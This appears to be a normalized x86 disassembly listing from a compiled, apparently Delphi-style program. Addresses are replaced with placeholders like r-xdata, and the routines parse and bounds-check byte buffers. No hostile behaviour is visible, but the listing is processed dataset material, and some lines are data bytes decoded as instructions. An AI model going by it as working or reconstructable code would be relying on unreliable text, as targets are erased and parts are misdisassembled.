mov [ ebp - 0xc ] 0x12
jmp r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov esi ebx
movzx eax [ esi + 0x105 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x5c ]
push eax
mov ecx [ ebp - 0xc ]
sub ecx 0x2
jno r-xdata
dec al
je r-xdata
movzx eax [ edx + eax ]
add eax 0x2
jno r-xdata
movzx edx [ edx + eax ]
lea ecx [ ebp - 0x48 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x48 ]
push r-xdata
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4649fc
mov edx [ ebp - 0x5c ]
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
call sub_46f6f8
mov eax [ ebp - 0x58 ]
push eax
mov eax 0x4
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e34
push 0x1
lea ecx [ ebp - 0x70 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4649dc
lea eax [ ebp - 0x70 ]
lea edx [ ebp - 0x60 ]
call sub_463e20
mov eax [ ebp - 0x60 ]
push eax
mov eax 0x10
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
jmp r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
movzx edx [ edx + eax ]
lea ecx [ ebp - 0x4c ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x4c ]
push r-xdata
mov eax 0x2
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
movzx eax [ edx + eax ]
mov edx 0x100
mul edx
mov ecx eax
jno r-xdata
movzx eax [ edx + eax ]
mov edx 0x100
mul edx
mov ecx eax
jno r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cc04
xor edx edx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
lea edx [ ebp - 0x10 ]
mov eax [ r-xdata ]
call sub_462560
retn
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov eax 0x5
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e34
mov eax 0x11
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e34
movzx edx [ edx + eax ]
lea ecx [ ebp - 0x50 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x50 ]
push r-xdata
mov eax 0x3
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
add ecx eax
jno r-xdata
movzx eax [ edx + eax ]
add ecx eax
jno r-xdata
movzx edx [ edx + eax ]
lea ecx [ ebp - 0x54 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x54 ]
lea eax [ ebp - 0x44 ]
mov edx 0x7
call sub_4051e4
mov eax [ ebp - 0x44 ]
push eax
mov eax 0x4
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
mov eax [ esi + 0xd0 ]
pop edx
call sub_474db8
jmp r-xdata
call sub_403e34
mov eax [ ebx + 0xd0 ]
pop edx
call sub_474de0
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
mov edx 0x100
mul edx
mov ecx eax
jno r-xdata
mov eax 0x5
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
add ecx eax
jno r-xdata
mov eax [ ebx + 0xd0 ]
pop edx
call sub_474de0
jmp r-xdata
call sub_403e34
sub_47cc04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cc4a
lea eax [ ebp - 0x74 ]
call sub_404e44
lea eax [ ebp - 0x60 ]
mov edx 0x12
call sub_404e68
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
call sub_406410
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
sub_47cc57
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
movzx ebx [ eax + 0xa1 ]
dec ebx
sub bl 0x2
jb r-xdata
mov ebx [ ebp + 0xc ]
push ebx
call sub_47be1c
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x8
mov ebx [ ebp + 0xc ]
push ebx
movzx ebx [ ebp + 0x8 ]
push ebx
call sub_47c5c8
jmp r-xdata
sub_47cc94
push ebx
push esi
mov esi ecx
xor ecx ecx
movzx ebx [ eax + 0xa1 ]
dec ebx
sub bl 0x2
jb r-xdata
mov ecx esi
call sub_47d1d4
mov ecx eax
jmp r-xdata
je r-xdata
mov eax ecx
pop esi
pop ebx
retn
mov ecx esi
call sub_47ccc4
mov ecx eax
jmp r-xdata
sub_47ccc4
push ebp
mov ebp esp
push ecx
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_47d1b5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xff
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
mov eax [ esi + 0xd0 ]
mov edx ebx
call sub_474ee4
mov ebx eax
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d1bc
lea eax [ ebp - 0x50 ]
mov edx 0x11
call sub_404e68
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
push 0x0
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xa0 ]
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
cmp eax 0x8
ja r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x30 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp [ eax * 4 + jump_table_47cd5d ]
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x24 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x28 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
mov eax 0x3
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
movzx eax [ edx + eax ]
mov [ ebp - 0x9 ] al
movzx eax [ ebp - 0x9 ]
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
push 0x0
lea edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xa0 ]
movzx eax [ ebp - 0x9 ]
dec al
je r-xdata
mov eax 0x4
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
jmp r-xdata
push 0x0
xor eax eax
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
sub al 0x2
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ ebp - 0x8 ] 0x12
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ esi + 0x105 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
mov ecx [ ebp - 0x8 ]
sub ecx 0x2
jno r-xdata
jmp r-xdata
movzx eax [ edx + eax ]
add eax 0x2
jno r-xdata
movzx edx [ edx + eax ]
lea ecx [ ebp - 0x38 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x38 ]
push r-xdata
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4649fc
mov edx [ ebp - 0x4c ]
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
call sub_46f6f8
mov eax [ ebp - 0x48 ]
push eax
mov eax 0x4
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e34
push 0x1
lea ecx [ ebp - 0x60 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4649dc
lea eax [ ebp - 0x60 ]
lea edx [ ebp - 0x50 ]
call sub_463e20
mov eax [ ebp - 0x50 ]
push eax
mov eax 0x10
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx edx [ edx + eax ]
lea ecx [ ebp - 0x3c ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x3c ]
push r-xdata
mov eax 0x2
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
movzx eax [ edx + eax ]
mov edx 0x100
mul edx
mov ecx eax
jno r-xdata
movzx eax [ edx + eax ]
mov edx 0x100
mul edx
mov ecx eax
jno r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov eax 0x5
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e34
mov eax 0x11
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e34
movzx edx [ edx + eax ]
lea ecx [ ebp - 0x40 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x40 ]
push r-xdata
mov eax 0x3
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
add ecx eax
jno r-xdata
movzx eax [ edx + eax ]
add ecx eax
jno r-xdata
movzx edx [ edx + eax ]
lea ecx [ ebp - 0x44 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x44 ]
lea eax [ ebp - 0x34 ]
mov edx 0x7
call sub_4051e4
mov eax [ ebp - 0x34 ]
push eax
mov eax 0x4
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
mov eax [ esi + 0xd0 ]
pop edx
call sub_474db8
jmp r-xdata
call sub_403e34
mov eax [ esi + 0xd0 ]
pop edx
call sub_474de0
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
mov edx 0x100
mul edx
mov ecx eax
jno r-xdata
mov eax 0x5
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
add ecx eax
jno r-xdata
mov eax [ esi + 0xd0 ]
pop edx
call sub_474db8
jmp r-xdata
call sub_403e34
sub_47d1d4
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_47d457
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x6
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
mov eax [ esi + 0xd0 ]
mov edx ebx
call sub_474ee4
mov ebx eax
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d45e
lea eax [ ebp - 0x28 ]
mov edx 0x9
call sub_404e68
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
push 0x0
lea edx [ ebp - 0x4 ]
mov ecx 0x2
mov eax esi
mov edi [ eax ]
call [ edi + 0xa0 ]
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
sub al 0x5a
je r-xdata
push 0x0
lea edx [ ebp - 0x4 ]
mov ecx 0x6
mov eax esi
mov edi [ eax ]
call [ edi + 0xa0 ]
push 0x0
mov eax 0x2
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
dec al
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
dec al
je r-xdata
movzx edx [ edx + eax ]
lea ecx [ ebp - 0x1c ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x1c ]
push r-xdata
mov eax 0x3
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
dec al
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
jmp r-xdata
movzx edx [ edx + eax ]
lea ecx [ ebp - 0x20 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x20 ]
push r-xdata
mov eax 0x4
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx edx [ edx + eax ]
lea ecx [ ebp - 0x24 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x24 ]
push r-xdata
mov eax 0x5
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx edx [ edx + eax ]
lea ecx [ ebp - 0x28 ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x28 ]
lea eax [ ebp - 0x18 ]
mov edx 0x7
call sub_4051e4
mov eax [ ebp - 0x18 ]
push eax
xor eax eax
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
mov edx 0x100
mul edx
mov ecx eax
jno r-xdata
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
add ecx eax
jno r-xdata
mov eax [ esi + 0xd0 ]
pop edx
call sub_474db8
call sub_403e34
sub_47d488
push ebp
mov ebp esp
mov ecx 0x7
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47d96b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xa4 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x90 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xa4 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x94 ]
mov edx [ ebp - 0x8 ]
mov edi [ edx + 0xa4 ]
mov [ edi + 0x105 ] al
mov eax [ ebp - 0x8 ]
movzx ebx [ eax + 0x94 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
xor edx edx
push ebp
push sub_47d90b
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xff
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0xa4 ]
mov eax [ ebp - 0x8 ]
call sub_47c220
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x94 ] 0x0
jne r-xdata
push 0x0
push 0x3
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0xa4 ]
mov ecx r-xdata
mov eax [ ebp - 0x8 ]
call sub_47b794
push 0x0
push 0x3
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0xa4 ]
mov ecx r-xdata
mov eax [ ebp - 0x8 ]
call sub_47b794
jmp r-xdata
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4648e8
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xa4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
push ebp
push sub_47d5e4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xa4 ]
mov ecx 0x2
mov edi [ eax ]
call [ edi + 0xa0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
cmp eax 0x8
ja r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x38 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp [ eax * 4 + jump_table_47d639 ]
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x24 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x28 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x30 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
push 0x0
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xa4 ]
mov ecx 0x2
mov edi [ eax ]
call [ edi + 0xa0 ]
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
movzx eax [ edx + eax ]
dec al
je r-xdata
mov [ ebp - 0xc ] 0x6
xor ebx ebx
jmp r-xdata
sub al 0x2
je r-xdata
xor eax eax
push ebp
push sub_47d8d6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xa4 ]
mov ecx [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xa0 ]
push ebx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xa4 ]
mov edx [ r-xdata ]
call sub_404114
mov eax [ eax + 0xd0 ]
mov eax [ eax + 0x20 ]
push eax
mov eax 0x4
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
mov eax 0x4
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
dec al
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ ebp - 0xc ] 0x12
mov bl 0x1
jmp r-xdata
movzx eax [ edx + eax ]
mov edx 0x100
mul edx
mov ecx eax
jno r-xdata
movzx eax [ edx + eax ]
add eax 0x2
jno r-xdata
mov eax 0x5
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e34
mov [ ebp - 0xc ] eax
jmp r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
add ecx eax
jno r-xdata
mov eax esi
pop edx
call sub_474db8
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d972
lea eax [ ebp - 0x3c ]
mov edx 0xb
call sub_404e68
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_406410
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
sub_47d98f
inc [ ebx ]
add [ eax ] al
add [ edx ] bh
cmp dh [ eax ]
add [ ebp - 0x75 ] dl
in al dx
push 0x0
xor edx edx
push ebp
push sub_47d9fa
push [ fs : edx ]
mov [ fs : edx ] esp
movzx edx [ eax + 0xa1 ]
dec edx
sub dl 0x2
jb r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47da01
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
call sub_47d474
jmp r-xdata
sub_47da04
push ebp
mov ebp esp
push 0x0
push ebx
xor ecx ecx
push ebp
push sub_47da67
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx ecx [ eax + 0xa1 ]
dec ecx
sub cl 0x2
jb r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47da6e
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
call sub_47d488
jmp r-xdata
sub_47da74
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
xor eax eax
push ebp
push sub_47dd95
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_406248
cmp eax 0x5
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47dd9c
lea eax [ ebp - 0x34 ]
mov edx 0x6
call sub_404e68
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
mov eax 0x3
test esi esi
je r-xdata
call sub_403e2c
cmp eax [ esi - 0x4 ]
jb r-xdata
movzx eax [ esi + eax ]
dec al
je r-xdata
mov edi 0x8
lea ecx [ ebp - 0x20 ]
mov eax 0x4
test esi esi
je r-xdata
sub al 0x2
je r-xdata
call sub_403e2c
cmp eax [ esi - 0x4 ]
jb r-xdata
mov eax 0x4
test esi esi
je r-xdata
jmp r-xdata
movzx edx [ esi + eax ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x20 ]
push r-xdata
lea ecx [ ebp - 0x24 ]
mov eax 0x5
test esi esi
je r-xdata
call sub_403e2c
cmp eax [ esi - 0x4 ]
jb r-xdata
mov edi 0x14
push 0x10
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
push 0x0
push 0x10
lea ecx [ ebp - 0x4 ]
mov edx 0x5
mov eax esi
call sub_463a00
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4649dc
mov [ ebp - 0xc ] 0x8
lea ebx [ ebp - 0x1c ]
call sub_403e2c
cmp eax [ esi - 0x4 ]
jb r-xdata
movzx edi [ esi + eax ]
add edi 0x4
jno r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ ebx ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov [ ebx ] ax
add ebx 0x2
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x34 ]
lea eax [ ebp - 0x1c ]
call sub_463e20
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_404e98
movzx edx [ esi + eax ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x24 ]
push r-xdata
lea ecx [ ebp - 0x28 ]
mov eax 0x6
test esi esi
je r-xdata
mov eax esi
call sub_406248
mov edx edi
add edx 0x5
jno r-xdata
call sub_403e34
call sub_403e2c
cmp edi [ esi - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ esi - 0x4 ]
jb r-xdata
cmp eax edx
jl r-xdata
call sub_403e34
movzx eax [ esi + edi ]
mov edx 0x100
mul edx
jno r-xdata
movzx edx [ esi + eax ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x28 ]
push r-xdata
lea ecx [ ebp - 0x2c ]
mov eax 0x7
test esi esi
je r-xdata
mov eax 0x4
test esi esi
je r-xdata
mov edx edi
add edx 0x1
jno r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ esi - 0x4 ]
jb r-xdata
call sub_403e2c
cmp eax [ esi - 0x4 ]
jb r-xdata
test esi esi
je r-xdata
call sub_403e34
movzx edx [ esi + eax ]
mov eax [ r-xdata ]
call sub_4625b0
push [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
mov edx 0x7
call sub_4051e4
jmp r-xdata
movzx eax [ esi + eax ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
push 0x0
mov eax 0x4
test esi esi
je r-xdata
call sub_403e2c
cmp edx [ esi - 0x4 ]
jb r-xdata
